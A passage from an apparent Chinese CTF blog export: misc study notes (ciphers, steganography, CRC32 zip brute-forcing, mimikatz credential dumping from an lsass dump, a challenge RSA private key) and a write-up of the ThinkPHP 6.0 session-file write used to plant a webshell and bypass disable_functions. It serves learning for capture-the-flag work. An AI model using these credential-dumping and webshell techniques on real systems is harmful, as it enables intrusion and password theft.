python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Autopy/misc/word_frequency_statistics/in.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> infile:<br>    content = infile.read()<br>table = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> c:(<span class="hljs-built_in">chr</span>(c),<span class="hljs-number">0</span>),[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>)]))<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> content:<br>    <span class="hljs-keyword">try</span>:<br>        table[c] += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>order = <span class="hljs-built_in">sorted</span>(table.items(),key = <span class="hljs-keyword">lambda</span> k:k[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(order)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([x[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> order]))<br></code></pre></td></tr></table></figure><p>也可以使用随波逐流自带的字频分析功能</p><hr><h2 id="png宽高CRC爆破"><a href="#png宽高CRC爆破" class="headerlink" title="png宽高CRC爆破"></a>png宽高CRC爆破</h2><p><a href="https://www.cnblogs.com/Yolololo/p/18628384">参考博客</a></p><p>这里的CRC指的是CRC32，也就是PNG图片的一个效验位，是一种不可逆运算，类似于MD5，作为数据效验或效验文件的完整性使用</p><p>当一个png图片宽高有问题时，010回有CRC报错</p><hr><h2 id="LSB隐写-数据提取"><a href="#LSB隐写-数据提取" class="headerlink" title="LSB隐写+数据提取"></a>LSB隐写+数据提取</h2><p>利用LSB（最低有效位）来进行隐写<br>原理：在大多数彩色图像中，每个像素的颜色值通常由三个颜色通道组成：红色（R）、绿色（G）和蓝色（B），每个通道的数值通常在0到255之间。在LSB隐写术中，秘密信息被嵌入到这些颜色通道的最低有效位（即二进制表示的最后一位）中。</p><p>例如，一个秘密信息比特“1”可以被嵌入到像素值129（二进制为10000001）的最低位上，使其变为130（二进制为10000010）。相反，一个“0”则保持不变或通过清除最低位来实现。例如：在.png图片的存储中，每个颜色会有8bit，LSB隐写就是修改了像数中最低的1bit，在人烟看来是看不出区别的，也就隐藏了信息</p><p>例如：把‘A’隐藏进图片，可以把‘A’转成16进制0x61再转成二进制01100001，再修改为红色通道的最低位为这些二进制字符串<br>工具：stegsolve<br>注意：隐写的载体不能使.jpg格式，jpg图片对像素数进行了有损的压缩，修改的信息可能会被破坏</p><p><strong>png lsb数据提取</strong></p><p>工具：cloacked-pixel-master、随波逐流</p><p>cloacked-pixel-master使用格式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python lsb<span class="hljs-selector-class">.py</span> extract xxx<span class="hljs-selector-class">.png</span> flag<span class="hljs-selector-class">.txt</span> key<br></code></pre></td></tr></table></figure><p>随波逐流的话直接放进去然后在图片工具栏找到Png lsb数据提取即可</p><hr><h2 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h2><p>PyC是Python字节码的缩写，它是Python解释器执行Python代码的核心。当Python代码被运行时，它会首先被解释器转换为PyC字节码，然后由CPython解释器执行。</p><p><code>Pyc反编译</code>在线网站进行反编译：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><hr><h2 id="电报码"><a href="#电报码" class="headerlink" title="电报码"></a>电报码</h2><p>电报码在线翻译网站：<a href="https://usetoolbar.com/convert/cccn.html">https://usetoolbar.com/convert/cccn.html</a></p><p>例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">0086 </span><span class="hljs-number">1562 </span><span class="hljs-number">2535 </span><span class="hljs-number">5174</span><br> <span class="hljs-string">人</span>    <span class="hljs-string">工</span>   <span class="hljs-string">智</span>   <span class="hljs-string">能</span><br></code></pre></td></tr></table></figure><hr><h2 id="汉字五笔编码"><a href="#汉字五笔编码" class="headerlink" title="汉字五笔编码"></a><strong>汉字五笔编码</strong></h2><p>汉字五笔编码在线网站查询：<a href="https://www.qqxiuzi.cn/bianma/wubi.php">https://www.qqxiuzi.cn/bianma/wubi.php</a></p><p>例如：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bnhn </span>s wwy vffg vffg rrhy fhnv<br>也   要 从   娃    娃  抓    起<br></code></pre></td></tr></table></figure><hr><h2 id="零宽度隐写"><a href="#零宽度隐写" class="headerlink" title="零宽度隐写"></a>零宽度隐写</h2><p>零宽度字符是隐藏的不显示的，也是不可打印的，也就是说使用大部分程序和编辑器是看不到这种字符的。它们存在于页面中主要用于调整字符的显示格式。</p><p>在线加解密网站：<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p><p><a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>例如这个例子：</p><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-2.png"></p><p>表面上看起来是这样的，但是实际上是这样</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">D﻿‏‎​﻿‍‎​‍﻿﻿​‍﻿﻿​‌‎‎​‏﻿‍​‌‎‎​‌‎‍​‍‎﻿​‌‎‏​﻿‍‍​﻿‍‍<span class="hljs-keyword">x</span><span class="hljs-number">8</span>CBEl<span class="hljs-number">3</span>S<span class="hljs-number">0</span>EtQgYbOyVbU<span class="hljs-number">2</span>JN<br></code></pre></td></tr></table></figure><p>两种判断方法。</p><p>第一种将文字复制入Sublime_txt，可以看到零宽度字符（灰色部分）</p><p>第二种就是肉眼看出异常。</p><hr><h2 id="栅栏加密-解密"><a href="#栅栏加密-解密" class="headerlink" title="栅栏加密&#x2F;解密"></a>栅栏加密&#x2F;解密</h2><p>在线加解密网站：<a href="https://ctf.bugku.com/tool/railfence">https://ctf.bugku.com/tool/railfence</a></p><p>也可以用随波逐流</p><p>栅栏密码是古典密码的一种，其原理是将一组要加密的明文划分为n个一组（n通常根据加密需求确定，且一般不会太大，以保证密码的复杂性和安全性），然后取每个组的第一个字符（有时也涉及取其他位置的字符，但规则需事先约定），根据情况将这些字符重新排列组合成一段无规律的话，形成密文。</p><p>栅栏密码的“栏”数，即分组后形成的“列”数或“行”数（具体取决于加密时的排列方式），是栅栏密码的一个重要参数。根据栏数的不同，栅栏密码可以分为多种类型，其中比较常见的是2栏栅栏密码。但理论上，栏数n可以是任何正整数（实际应用中受限于明文的长度和加密的安全性要求）。</p><p>例如题目给我们一个打乱顺序的字符串：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">kanbbrgghjl&#123;zb<span class="hljs-strong">____</span>&#125;vtlaln<br></code></pre></td></tr></table></figure><p>通过栅栏加密得到原始字符串，这里栏数需要一个个试</p><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-3.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">kzna</span><span class="hljs-template-variable">&#123;blnl_abj_lbh_trg_vg&#125;</span><br></code></pre></td></tr></table></figure><p>这里顺序还是不对还需要进行rot13解密</p><hr><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p><a href="https://so.csdn.net/so/search?q=%E5%87%AF%E6%92%92%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">凯撒加密</a>是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期凯撒的名字命名的，据说凯撒曾用此方法与其将军们进行联系。</p><p>例如rot13即为凯撒密码的一种特殊情况，即当凯撒密码的密钥为13的情况。</p><hr><h2 id="CRC碰撞"><a href="#CRC碰撞" class="headerlink" title="CRC碰撞"></a>CRC碰撞</h2><p>什么是CRC32</p><p>CRC 本身是「冗余校验码」的意思，CRC32 则表示会产生一个 32 bit ( 8 位十六进制数) 的校验值。由于 CRC32 产生校验值时源数据块的每一个 bit (位) 都参与了计算，所以数据块中即使只有一位发生了变化，也会得到不同的 CRC32 值。<br>CRC32 校验码出现在很多文件中比如 png 文件，同样 zip 中也有 CRC32 校验码。值得注意的是 zip 中的 CRC32 是未加密文件的校验值。<br>CRC32攻击</p><p>这也就导致了基于 CRC32 的攻击手法。<br>文件内内容很少 (一般比赛中大多为 4 字节左右)<br>加密的密码很长<br>我们不去爆破压缩包的密码，而是直接去爆破源文件的内容 (一般都是可见的字符串)，从而获取想要的信息。</p><p>python脚本</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs scss"># python3<br>import zipfile<br>import string<br>import binascii<br><br><br>def <span class="hljs-built_in">CrackCrc</span>(crc):<br>    for i in dic:<br>        for j in dic:<br>            for k in dic:<br>                for h in dic:<br>                    s = i + j + k + h<br>                    if crc == (binascii.<span class="hljs-built_in">crc32</span>(s.<span class="hljs-built_in">encode</span>())):<br>                        f.<span class="hljs-built_in">write</span>(s)<br>                        return<br><br><br>def <span class="hljs-built_in">CrackZip</span>():<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>):<br>        file = <span class="hljs-string">&#x27;out&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>        crc = zipfile.<span class="hljs-built_in">ZipFile</span>(file, <span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-built_in">getinfo</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>).CRC<br>        <span class="hljs-built_in">CrackCrc</span>(crc)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span> + <span class="hljs-string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">float</span>((i + <span class="hljs-number">1</span>) / <span class="hljs-number">68</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>dic = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;+/=&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;crc32.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nCRC32begin&quot;</span>)<br><span class="hljs-built_in">CrackZip</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CRC32finished&quot;</span>)<br>f.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><hr><h2 id="DTMF拨号音识别"><a href="#DTMF拨号音识别" class="headerlink" title="DTMF拨号音识别"></a>DTMF拨号音识别</h2><p><a href="https://baike.baidu.com/item/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91/10445258?fromModule=lemma_inlink">双音多频</a> DTMF（Dual Tone Multi Frequency），双音多频，由高频群和低频群组成，高低频群各包含4个频率。一个高频信号和一个低频信号叠加组成一个组合信号，代表一个数字。DTMF信号有16个编码。利用DTMF信令可选择呼叫相应的<a href="https://baike.baidu.com/item/%E5%AF%B9%E8%AE%B2%E6%9C%BA/641751?fromModule=lemma_inlink">对讲机</a>。</p><p>利用软件进行识别</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">http://aluigi.altervista.org/mytoolz/dtmf2num.zip</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">输入命令dtmf2num<span class="hljs-selector-class">.exe</span> girlfriend.wav<br></code></pre></td></tr></table></figure><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-4.png"></p><hr><h2 id="手机键盘密码"><a href="#手机键盘密码" class="headerlink" title="手机键盘密码"></a>手机键盘密码</h2><p>手机键盘加密方式，是每个数字键上有3-4个字母，用两位数字来表示字母，例如：ru用手机键盘表示就是：7382，那么这里就可以知道了，手机键盘加密方式不可能用1开头，第二位数字不可能超过4，解密的时候参考此</p><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-5.png"></p><p>也有另一种方式，数字顺序按多少下，例如999就是按三下9键即为y</p><hr><h2 id="exif信息与exiftool"><a href="#exif信息与exiftool" class="headerlink" title="exif信息与exiftool"></a>exif信息与exiftool</h2><p><strong>EXIF信息，是可交换图像文件的缩写，是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。EXIF可以附加于JPEG、TIFF、RIFF等文件之中，为其增加有关数码相机拍摄信息的内容和索引图或图像处理软件的版本信息。</strong></p><hr><p>ExifTool是一款免费开源的图像信息查看工具，一个命令行应用程序。可用于读写和编辑图像（主要）、音视频和PDF等文件的元数据（metadata）。元数据是由一系列参数（下文为了与命令行参数做区别将称为标签）组成，如快门速度、光圈、白平衡、相机品牌和型号、镜头、焦距等等。而ExifTool可以帮助用户读取和处理这些数据， 支持许多不同的元数据格式，包括 EXIF，GPS，IPTC，XMP，JFIF，GeoTIFF，ICC 配置文件等等。支持多种输出格式设置选项（包括制表符分隔，HTML，XML 和 JSON），还可以多语言输出（cs，de，en，en-ca，en-gb，es，fi，fr，it，ja，ko，nl，pl，ru，sv，tr，zh-cn 或 zh-tw）。可以读取和写入许多数码相机的制造商说明。</p><p><strong>使用实例：使用Kali上的exiftool工具，批量分析图片，寻找flag</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">exiftool * <span class="hljs-string">| grep flag</span><br></code></pre></td></tr></table></figure><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-6.png"></p><hr><h2 id="mimikatz与lsass"><a href="#mimikatz与lsass" class="headerlink" title="mimikatz与lsass"></a>mimikatz与lsass</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p><ul><li><strong>lsass是<a href="http://d.hatena.ne.jp/keyword/windows">windows</a>系统的一个进程，用于本地安全和登陆策略。</strong></li><li><strong>Procdump工具一般用来抓取windows的lsass进程中的用户明文密码</strong><br><strong>lsass是windows系统的一个进程，用于本地安全和登陆策略。</strong></li></ul><p>mimikatz下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917</a></p><p>注意：点开64位的“猕猴桃”，输入以下命令（记得右键管理员权限打开mimikatz，不然会报错）</p><p>使用格式：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso">将lsass.dmp文件放到mimikatz.exe下目录<br><span class="hljs-comment">//提升权限</span><br>privilege<span class="hljs-type">::debug</span><br><span class="hljs-comment">//载入dmp文件</span><br>sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp<br><span class="hljs-comment">//读取登陆密码</span><br>sekurlsa<span class="hljs-type">::logonpasswords</span> <span class="hljs-literal">full</span><br><br>得到密码<br>W3lc0meToD0g3<br></code></pre></td></tr></table></figure><hr><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><p><strong>TLS（Transport Layer Security）是一种加密通讯协议，它用于在计算机网络上保证通信安全和数据完整性。TLS 通常用于安全地传输 HTTP、SMTP、FTP 等应用层协议。TLS协议位于传输层和应用层中间，其功能是一个加密通道，和上层应用协议无关。由于HTTP采用明文传输，很容易被攻击者窃听或者篡改内容，通过引用TLS对HTTP的内容进行加密等操作，可以有效防止窃听、篡改和劫持等。</strong></p><p>TLS流量是指通过TLS协议加密的数据传输，它在客户端和服务器之间建立一个加密的通道，确保数据在传输过程中不被窃听、篡改或伪造。</p><p>一般的TLS流量就是找到key，导入key，在导入key之后就会多出几个流量包（即加密流量包），在里边会有想要的答案</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ<br>LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO<br>vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB<br>AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4<br>QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/<br>QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN<br>czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ<br>ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9<br>kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN<br>+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1<br>AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH<br>/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH<br>2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>这里将私钥保存为private.key，wireshark允许添加TLS私钥查看加密传输数据</p><p>步骤：</p><p><strong>点击 编辑–&gt;首选项–&gt;Protocols–&gt;TLS</strong></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-EasyThinking</title>
      <link href="/2025/04/17/GYCTF2020-EasyThinking/"/>
      <url>/2025/04/17/GYCTF2020-EasyThinking/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="GYCTF2020-EasyThinking"></a>GYCTF2020-EasyThinking</h1><p>扫描目录发现有源码文件<a href="http://www.zip,访问下载/">www.zip，访问下载</a><br>下载源码，打开README发现该环境使用了tp 6.0框架</p><h2 id="知识点-tp6-0任意文件操作漏洞"><a href="#知识点-tp6-0任意文件操作漏洞" class="headerlink" title="知识点 tp6.0任意文件操作漏洞"></a>知识点 tp6.0任意文件操作漏洞</h2><p><a href="https://j0k3r.top/2020/03/02/ThinkPHP_v6.0.0_ArbitraryFileWriting/#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">tp6.0任意文件操作漏洞分析</a></p><p>tp6.0会默认在&#x2F;runtime&#x2F;session&#x2F;目录下，创建<code>sess_xxx</code>格式的文件，这里的xxx是PHPSESSID（32位），而文件的内容就是session的内容</p><hr><p>代码审计</p><p><strong>web\app\home\controller\Member.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userId</span>)&#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-variable">$userId</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&quot;/home/member/index&quot;</span>);<br>            &#125;<br>    &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">phppublic <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userId</span>)&#123;  <br>        <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-variable">$userId</span>);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&quot;/home/member/index&quot;</span>);  <br>    &#125;  <br>&#125;  <br></code></pre></td></tr></table></figure><ul><li><strong>功能：</strong><br>判断 <code>$userId</code> 是否存在，如果存在，则把用户ID保存到 session（标记用户已登录），然后跳转到会员首页。</li></ul><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">phppublic <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;  <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))  <br>        &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>        &#125;  <br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);  <br>        <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))  <br>        &#123;  <br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);  <br>        &#125;  <br>    &#125;  <br>&#125;  <br></code></pre></td></tr></table></figure><ul><li><strong>功能：</strong><br>判断当前请求是否为 POST 请求。<br>如果用户未登录（session 中没有 UID），跳转到登录页。<br>获取 POST 的所有输入数据。<br>如果 session 中没有存储“Record”，则把输入里的 <code>key</code> 写入 session 里的“Record”。</li></ul><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">login页面抓包，修改PHPSESSID的值为xxx.php，保持<span class="hljs-number">32</span>位的长度<br>进入之后在搜索页面<br>存在一个post传参，我们搜索的值也就是<span class="hljs-built_in">key</span>的值，会保存在 PHPSESSID文件中<br></code></pre></td></tr></table></figure><hr><p><strong>1、在login页面下登录抓包，修改PHPSESSID值</strong></p><p><img src="/../image/GYCTF2020-EasyThinking-3.png"></p><p><strong>2. search搜索页面，输入一句话木马抓包</strong></p><p>看到这里的PHPSESSID即为我们登录时修改的PHPSESSID值，那么我们的key会保存在 tp6 默认的session文件处</p><p><img src="/../image/GYCTF2020-EasyThinking-2.png"></p><p><strong>3.webshell连接 url&#x2F;runtime&#x2F;session&#x2F;sess_PHPSESSID</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">42</span>e2c0ca-b4a1-<span class="hljs-number">4</span>da5-<span class="hljs-number">9</span>d3a-<span class="hljs-number">37</span>bfb5321943.node5.buuoj.cn:<span class="hljs-number">81</span>/runtime/session/sess_1234567891234567891234567890.php<br></code></pre></td></tr></table></figure><p>flag是在根目录下的，但是我们无法看到flag内容，发现这里有readflag文件 &#x3D;&gt; 运行readflag来得到flag</p><p>突破disable_functions函数的限制，用蚁剑插件然后选择PHP7 Backtrace UAF模式即可</p><p><img src="/../image/GYCTF2020-EasyThinking-1.png"></p><p>执行.&#x2F;readflag拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> thinkphp v6.0任意文件操作漏洞 </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2021-easycms</title>
      <link href="/2025/04/17/GKCTF2021-easycms/"/>
      <url>/2025/04/17/GKCTF2021-easycms/</url>
      
